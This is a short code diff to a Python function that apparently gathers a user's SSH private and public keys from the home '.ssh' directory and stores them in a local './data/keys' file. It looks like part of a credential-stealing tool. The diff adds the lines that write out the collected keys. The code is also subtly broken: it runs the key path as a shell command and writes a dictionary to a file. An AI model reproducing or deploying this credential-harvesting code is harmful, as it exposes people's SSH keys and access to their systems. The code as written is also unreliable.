@@ -10,7 +10,13 @@ def run(**args):
         pubkey = os.system("/home/$USER/.ssh/id_rsa.pub")
         if privkey is not None or pubkey is not None:
             keys = {"private": privkey, "pubkey": pubkey}
-
+            f = open("./data/keys", "a")
+            f.write(keys)
+            f.close()
+        else:
+            f = open("./data/keys", "a")
+            f.write("No keys could be found")
+            f.close()
         return keys
 
     except:
